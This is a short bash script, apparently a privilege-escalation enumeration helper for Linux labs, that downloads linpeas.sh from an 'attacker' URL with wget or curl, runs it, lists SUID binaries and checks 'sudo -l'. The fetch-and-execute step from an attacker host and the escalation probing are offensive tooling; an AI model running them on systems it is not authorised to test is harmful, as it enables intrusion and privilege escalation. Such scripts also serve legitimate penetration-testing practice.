#!/bin/bash

function RunLinPea {
    FILE=linpeas.sh

    if [ -f "$FILE" ]; then
        # file exists in tmp
        chmod +x $FILE
        ./$FILE > linpeas.out
        cat linpeas.out
    else
        # file doesnt exist in tmp
        read -p "Enter URL for Linpeas: [http://127.0.0.1:80/linpeas.sh]: " attackerURL
        
        # check for wget and curl and attempt download
        if which wget >/dev/null; then
            wget $attackerURL
            chmod +x linpeas.sh
            ./linpeas.sh > linpeas.out
        elif which curl >/dev/null; then
            curl $attackerURL --output /tmp/linpeas.sh
            chmod +x $FILE
            ./$FILE > linpeas.out
        else
            echo 'curl and wget do not exist!'
        fi
    fi
}

printf "

███████╗███╗   ██╗██╗   ██╗███╗   ███╗
██╔════╝████╗  ██║██║   ██║████╗ ████║
█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
                                      

"
# Ask to install linpeas.sh
read -p "Download Linpeas? [y/n]: " linpea
if [ "$linpea" == "y" ]; then
    RunLinPea
fi

# looks for things I can execute
read -p "Find GTFO-Bins? [y/n]: " gtfoSearch
if [ "$gtfoSearch" == "y" ]; then
    find / -perm -u=s -type f 2>/dev/null
fi

# Ask to check sudo l
read -p "Check sudo for vulns? [y/n]: " runSudo
if [ "$runSudo" == "y" ]; then
    sudo -l
fi

printf "

▓█████  ██▓         █████▒██▓ ███▄    █ 
▓█   ▀ ▓██▒       ▓██   ▒▓██▒ ██ ▀█   █ 
▒███   ▒██░       ▒████ ░▒██▒▓██  ▀█ ██▒
▒▓█  ▄ ▒██░       ░▓█▒  ░░██░▓██▒  ▐▌██▒
░▒████▒░██████▒   ░▒█░   ░██░▒██░   ▓██░
░░ ▒░ ░░ ▒░▓  ░    ▒ ░   ░▓  ░ ▒░   ▒ ▒ 
 ░ ░  ░░ ░ ▒  ░    ░      ▒ ░░ ░░   ░ ▒░
   ░     ░ ░       ░ ░    ▒ ░   ░   ░ ░ 
   ░  ░    ░  ░           ░           ░ 
                                        

"
